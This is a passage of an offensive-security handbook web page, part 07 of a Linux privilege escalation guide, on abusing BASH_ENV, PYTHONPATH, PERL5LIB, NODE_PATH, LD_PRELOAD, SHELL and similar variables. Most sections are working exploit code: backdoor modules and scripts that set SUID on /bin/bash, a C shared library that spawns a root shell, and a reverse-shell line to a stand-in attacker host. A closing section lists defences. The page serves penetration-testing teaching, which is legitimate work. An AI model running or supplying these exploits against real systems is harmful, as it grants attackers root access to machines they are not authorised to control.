+<h3 id="8-bash-env-and-env-exploitation">8. BASH_ENV and ENV Exploitation<a aria-label="Link to this section" class="g-anchor" href="#8-bash-env-and-env-exploitation">#</a></h3>
+<p><code>BASH_ENV</code> is read by non-interactive bash shells (cron, scripts). <code>ENV</code> is used by POSIX sh.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious initialization file</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/bashrc.sh<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">chmod +s /bin/bash</span>
+<span class="s">echo "Backdoor installed"</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 2. Set BASH_ENV</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">BASH_ENV</span><span class="o">=</span>/tmp/bashrc.sh
+
+<span class="c1"># 3. Any non-interactive bash script run as root will execute this</span>
+sudo<span class="w"> </span>/bin/bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"echo test"</span>
+<span class="c1"># Or wait for cron to run a bash script</span>
+</code></pre></div>
+<p><strong>Cron Attack</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add to user's crontab (if you can)</span>
+<span class="nv">BASH_ENV</span><span class="o">=</span>/tmp/backdoor.sh
+*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>root<span class="w"> </span>/bin/bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">"backup_script"</span>
+</code></pre></div>
+<hr/>
+<h3 id="9-python-environment-exploitation">9. Python Environment Exploitation<a aria-label="Link to this section" class="g-anchor" href="#9-python-environment-exploitation">#</a></h3>
+<h4 id="a-pythonpath-hijacking">A. PYTHONPATH Hijacking<a aria-label="Link to this section" class="g-anchor" href="#a-pythonpath-hijacking">#</a></h4>
+<p>Modules are loaded from <code>PYTHONPATH</code> directories.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Identify Python script called by root</span>
+<span class="c1"># Example: /usr/local/bin/backup.py</span>
+<span class="c1"># Contains: import os</span>
+
+<span class="c1"># 2. Create malicious os.py in writable directory</span>
+mkdir<span class="w"> </span>/tmp/pylibs
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/pylibs/os.py<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">import os</span>
+<span class="s">import subprocess</span>
+<span class="s"># Backdoor</span>
+<span class="s">subprocess.call(["chmod", "+s", "/bin/bash"])</span>
+<span class="s"># Forward to real os</span>
+<span class="s">import sys</span>
+<span class="s">sys.path.remove('/tmp/pylibs')</span>
+<span class="s">sys.path.insert(0, '/usr/lib/python3/dist-packages')</span>
+<span class="s">import os as real_os</span>
+<span class="s">sys.modules['os'] = real_os</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 3. Set PYTHONPATH</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/pylibs
+
+<span class="c1"># 4. Run the Python script as root</span>
+sudo<span class="w"> </span>/usr/local/bin/backup.py
+</code></pre></div>
+<h4 id="b-python-startup-file-pythonstartup">B. Python Startup File (<code>PYTHONSTARTUP</code>)<a aria-label="Link to this section" class="g-anchor" href="#b-python-startup-file-pythonstartup">#</a></h4>
+<p>Executed when interactive Python starts.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/startup.py<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">import os</span>
+<span class="s">os.system("chmod +s /bin/bash")</span>
+<span class="s">EOF</span>
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">PYTHONSTARTUP</span><span class="o">=</span>/tmp/startup.py
+sudo<span class="w"> </span>python3<span class="w">  </span><span class="c1"># When root runs Python interactively</span>
+</code></pre></div>
+<hr/>
+<h3 id="10-perl-environment-exploitation">10. Perl Environment Exploitation<a aria-label="Link to this section" class="g-anchor" href="#10-perl-environment-exploitation">#</a></h3>
+<h4 id="a-perl5lib-and-perllib">A. PERL5LIB and PERLLIB<a aria-label="Link to this section" class="g-anchor" href="#a-perl5lib-and-perllib">#</a></h4>
+<p>Module search paths for Perl.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">mkdir<span class="w"> </span>/tmp/perllibs
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/perllibs/File/Find.pm<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">package File::Find;</span>
+<span class="s">sub find { system("chmod +s /bin/bash"); }</span>
+<span class="s">1;</span>
+<span class="s">EOF</span>
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">PERL5LIB</span><span class="o">=</span>/tmp/perllibs
+sudo<span class="w"> </span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">'use File::Find; find();'</span>
+</code></pre></div>
+<h4 id="b-perl-debug-and-perl-destruct-level">B. PERL_DEBUG and PERL_DESTRUCT_LEVEL<a aria-label="Link to this section" class="g-anchor" href="#b-perl-debug-and-perl-destruct-level">#</a></h4>
+<p>Debugging variables can be exploited in some circumstances.</p>
+<hr/>
+<h3 id="11-node-js-environment-exploitation">11. Node.js Environment Exploitation<a aria-label="Link to this section" class="g-anchor" href="#11-node-js-environment-exploitation">#</a></h3>
+<h4 id="a-node-path-module-hijacking">A. NODE_PATH Module Hijacking<a aria-label="Link to this section" class="g-anchor" href="#a-node-path-module-hijacking">#</a></h4>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">mkdir<span class="w"> </span>/tmp/nodemods
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/nodemods/fs.js<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">const { exec } = require('child_process');</span>
+<span class="s">exec('chmod +s /bin/bash');</span>
+<span class="s">module.exports = require('fs_original');</span>
+<span class="s">EOF</span>
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">NODE_PATH</span><span class="o">=</span>/tmp/nodemods
+sudo<span class="w"> </span>node<span class="w"> </span>/path/to/script.js
+</code></pre></div>
+<hr/>
+<h3 id="12-ssh-environment-exploitation">12. SSH Environment Exploitation<a aria-label="Link to this section" class="g-anchor" href="#12-ssh-environment-exploitation">#</a></h3>
+<p>If <code>PermitUserEnvironment</code> is enabled in SSH, users can set environment variables.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create ~/.ssh/environment</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"LD_PRELOAD=/tmp/backdoor.so"</span><span class="w"> </span>&gt;<span class="w"> </span>~/.ssh/environment
+
+<span class="c1"># 2. Wait for root to SSH in</span>
+<span class="c1"># (or if SSH is configured to allow root login)</span>
+
+<span class="c1"># 3. When root connects, LD_PRELOAD loads as root</span>
+</code></pre></div>
+<p><strong>Check SSH Configuration</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"PermitUserEnvironment"</span><span class="w"> </span>/etc/ssh/sshd_config
+<span class="c1"># If: PermitUserEnvironment yes  -&gt; Exploitable!</span>
+</code></pre></div>
+<hr/>
+<h3 id="13-tmpdir-exploitation">13. TMPDIR Exploitation<a aria-label="Link to this section" class="g-anchor" href="#13-tmpdir-exploitation">#</a></h3>
+<p>If a privileged program uses <code>TMPDIR</code> to create temporary files, you can control file location.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create directory with malicious permissions</span>
+mkdir<span class="w"> </span>/tmp/evil_tmp
+chmod<span class="w"> </span><span class="m">777</span><span class="w"> </span>/tmp/evil_tmp
+
+<span class="c1"># 2. Set TMPDIR</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TMPDIR</span><span class="o">=</span>/tmp/evil_tmp
+
+<span class="c1"># 3. Run program that creates temporary files</span>
+<span class="c1"># If it creates a temporary script and executes it:</span>
+<span class="c1"># (this depends on the specific program behavior)</span>
+
+<span class="c1"># 4. Race condition: replace file before execution</span>
+</code></pre></div>
+<p><strong>Example: Kernel Compilation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If root compiles kernel with your TMPDIR</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TMPDIR</span><span class="o">=</span>/tmp/evil_tmp
+sudo<span class="w"> </span>make<span class="w">  </span><span class="c1"># May create files in /tmp/evil_tmp</span>
+</code></pre></div>
+<hr/>
+<h3 id="14-histfile-manipulation">14. HISTFILE Manipulation<a aria-label="Link to this section" class="g-anchor" href="#14-histfile-manipulation">#</a></h3>
+<p>If root uses your <code>HISTFILE</code>, you can inject commands into root's history.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create fake history file</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1"</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/fake_history
+
+<span class="c1"># Set HISTFILE</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">HISTFILE</span><span class="o">=</span>/tmp/fake_history
+
+<span class="c1"># When root runs a command, it appends to your history</span>
+<span class="c1"># But you can't make root run your commands</span>
+</code></pre></div>
+<hr/>
+<h3 id="15-shell-variable-exploitation">15. SHELL Variable Exploitation<a aria-label="Link to this section" class="g-anchor" href="#15-shell-variable-exploitation">#</a></h3>
+<p>Some programs use <code>SHELL</code> to spawn a shell.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious shell wrapper</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/shell.sh<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">chmod +s /bin/bash</span>
+<span class="s">/bin/bash "$@"</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/shell.sh
+
+<span class="c1"># 2. Set SHELL</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>/tmp/shell.sh
+
+<span class="c1"># 3. Trigger program that uses SHELL</span>
+sudo<span class="w"> </span>less<span class="w"> </span>/etc/hosts<span class="w">  </span><span class="c1"># 'v' command opens editor, uses SHELL</span>
+<span class="c1"># Or: sudo -i  # Uses SHELL to start login shell</span>
+</code></pre></div>
+<hr/>
+<h3 id="16-practical-exploitation-workflow">16. Practical Exploitation Workflow<a aria-label="Link to this section" class="g-anchor" href="#16-practical-exploitation-workflow">#</a></h3>
+<p><strong>Step 1: Enumerate Environment Variables</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check current environment</span>
+printenv<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort
+
+<span class="c1"># Check what sudo preserves</span>
+sudo<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>env_keep
+
+<span class="c1"># Check root's environment</span>
+cat<span class="w"> </span>/proc/1/environ<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\0'</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort
+
+<span class="c1"># Check cron's environment</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^#'</span>
+</code></pre></div>
+<p><strong>Step 2: Identify Privileged Programs</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find SUID/SGID binaries</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find scripts executed by root (cron, init)</span>
+find<span class="w"> </span>/etc/cron*<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/etc/init.d/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Step 3: Check for Sanitization</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Test if LD_PRELOAD works on SUID binary</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/lib/libc.so.6<span class="w">  </span><span class="c1"># Already exists</span>
+/usr/bin/passwd
+<span class="c1"># If it works, LD_PRELOAD is NOT sanitized</span>
+
+<span class="c1"># Check if LD_LIBRARY_PATH works</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/tmp
+/usr/bin/passwd
+</code></pre></div>
+<p><strong>Step 4: Choose Attack Vector</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Prioritize based on:</span>
+<span class="c1"># 1. LD_PRELOAD (if env_keep or unsanitized)</span>
+<span class="c1"># 2. LD_LIBRARY_PATH (if unsanitized)</span>
+<span class="c1"># 3. EDITOR/VISUAL (if root uses sudoedit or crontab -e)</span>
+<span class="c1"># 4. PATH (if writable directory in PATH)</span>
+<span class="c1"># 5. BASH_ENV (if cron uses bash)</span>
+<span class="c1"># 6. PYTHONPATH/PERL5LIB (if root runs scripts)</span>
+</code></pre></div>
+<p><strong>Step 5: Create and Execute Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Example: LD_PRELOAD exploit</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;stdlib.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+<span class="s">__attribute__((constructor)) void init() {</span>
+<span class="s">    setuid(0);</span>
+<span class="s">    system("/bin/bash -p");</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span>-o<span class="w"> </span>/tmp/backdoor.so
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/backdoor.so
+sudo<span class="w"> </span>/bin/true<span class="w">  </span><span class="c1"># Any command</span>
+</code></pre></div>
+<p><strong>Step 6: Verify Escalation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">whoami
+<span class="c1"># root</span>
+id
+<span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+</code></pre></div>
+<hr/>
+<h3 id="17-defensive-measures">17. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#17-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Sanitize Environment in SUID Binaries</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">c</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-c"><span class="c1">// In C/C++ programs</span>
+<span class="n">clearenv</span><span class="p">();</span><span class="w">  </span><span class="c1">// Clear all environment variables</span>
+<span class="n">setenv</span><span class="p">(</span><span class="s">"PATH"</span><span class="p">,</span><span class="w"> </span><span class="s">"/usr/local/bin:/usr/bin:/bin"</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use <code>env</code> to Reset Environment</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Run command with clean environment</span>
+env<span class="w"> </span>-<span class="w"> </span>/usr/bin/safe_command
+
+<span class="c1"># In scripts</span>
+<span class="c1">#!/bin/bash</span>
+<span class="nb">exec</span><span class="w"> </span>env<span class="w"> </span>-i<span class="w"> </span>/usr/bin/safe_script
+</code></pre></div>
+</li>
+<li>
+<p><strong>Configure Sudo Properly</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># In /etc/sudoers</span>
+Defaults<span class="w"> </span>env_reset<span class="w">  </span><span class="c1"># Reset environment</span>
+Defaults<span class="w"> </span><span class="nv">env_keep</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"HOME"</span><span class="w">  </span><span class="c1"># Only necessary variables</span>
+
+<span class="c1"># Never include LD_PRELOAD in env_keep</span>
+Defaults<span class="w"> </span>env_keep<span class="w"> </span>-<span class="o">=</span><span class="w"> </span><span class="s2">"LD_PRELOAD"</span>
+Defaults<span class="w"> </span>env_keep<span class="w"> </span>-<span class="o">=</span><span class="w"> </span><span class="s2">"LD_LIBRARY_PATH"</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Set Explicit PATH in Scripts</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="ch">#!/bin/bash</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/bin:/bin
+<span class="c1"># Now use commands without absolute paths safely</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Absolute Paths in Scripts</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="ch">#!/bin/bash</span>
+/bin/echo<span class="w"> </span><span class="s2">"Using absolute path"</span>
+/usr/bin/tar<span class="w"> </span>-czf<span class="w"> </span>/backup/backup.tar.gz<span class="w"> </span>/data
+</code></pre></div>
+</li>
+<li>
+<p><strong>Remove Unnecessary Environment Variables</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># In /etc/profile or /etc/bash.bashrc</span>
+<span class="nb">unset</span><span class="w"> </span>LD_PRELOAD
+<span class="nb">unset</span><span class="w"> </span>LD_LIBRARY_PATH
+</code></pre></div>
+</li>
+<li>
+<p><strong>Set Secure Mount Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Mount /tmp with noexec to prevent library execution</span>
+mount<span class="w"> </span>-o<span class="w"> </span>remount,noexec<span class="w"> </span>/tmp
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use AppArmor/SELinux</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict which libraries can be loaded</span>
+<span class="c1"># AppArmor profile for sensitive binaries</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Audit Environment Variables</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check what users can set</span>
+<span class="k">for</span><span class="w"> </span>user<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>getent<span class="w"> </span>passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d:<span class="w"> </span>-f1<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$user</span><span class="s2"> ==="</span>
+<span class="w">    </span>sudo<span class="w"> </span>-u<span class="w"> </span><span class="nv">$user</span><span class="w"> </span>env<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="k">done</span>
+</code></pre></div>
+</li>
+</ol>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 07 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/06-path-hijacking.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 06</span><strong>PATH Hijacking</strong></a><a class="g-chapter-card" href="../privesc/08-kernel-exploits.html" data-next-privesc><span class="g-chapter-card-label">Next / Part 08</span><strong>Kernel Exploits</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#environment-variable-abuse-for-privilege-escalation" data-toc-link>Environment Variable Abuse for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-environment-variables" data-toc-link>1. Understanding Environment Variables</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-exploitable-variables" data-toc-link>2. Enumeration: Finding Exploitable Variables</a><a class="g-toc-link depth-3" href="#3-ld-preload-exploitation-most-dangerous" data-toc-link>3. LD_PRELOAD Exploitation (Most Dangerous)</a><a class="g-toc-link depth-3" href="#4-ld-library-path-exploitation" data-toc-link>4. LD_LIBRARY_PATH Exploitation</a><a class="g-toc-link depth-3" href="#5-ifs-internal-field-separator-exploitation" data-toc-link>5. IFS (Internal Field Separator) Exploitation</a><a class="g-toc-link depth-3" href="#6-editor-visual-exploitation" data-toc-link>6. EDITOR/VISUAL Exploitation</a><a class="g-toc-link depth-3" href="#7-pager-exploitation" data-toc-link>7. PAGER Exploitation</a><a class="g-toc-link depth-3" href="#8-bash-env-and-env-exploitation" data-toc-link>8. BASH_ENV and ENV Exploitation</a><a class="g-toc-link depth-3" href="#9-python-environment-exploitation" data-toc-link>9. Python Environment Exploitation</a><a class="g-toc-link depth-3" href="#10-perl-environment-exploitation" data-toc-link>10. Perl Environment Exploitation</a><a class="g-toc-link depth-3" href="#11-node-js-environment-exploitation" data-toc-link>11. Node.js Environment Exploitation</a><a class="g-toc-link depth-3" href="#12-ssh-environment-exploitation" data-toc-link>12. SSH Environment Exploitation</a><a class="g-toc-link depth-3" href="#13-tmpdir-exploitation" data-toc-link>13. TMPDIR Exploitation</a><a class="g-toc-link depth-3" href="#14-histfile-manipulation" data-toc-link>14. HISTFILE Manipulation</a><a class="g-toc-link depth-3" href="#15-shell-variable-exploitation" data-toc-link>15. SHELL Variable Exploitation</a><a class="g-toc-link depth-3" href="#16-practical-exploitation-workflow" data-toc-link>16. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#17-defensive-measures" data-toc-link>17. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 07 / 18 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
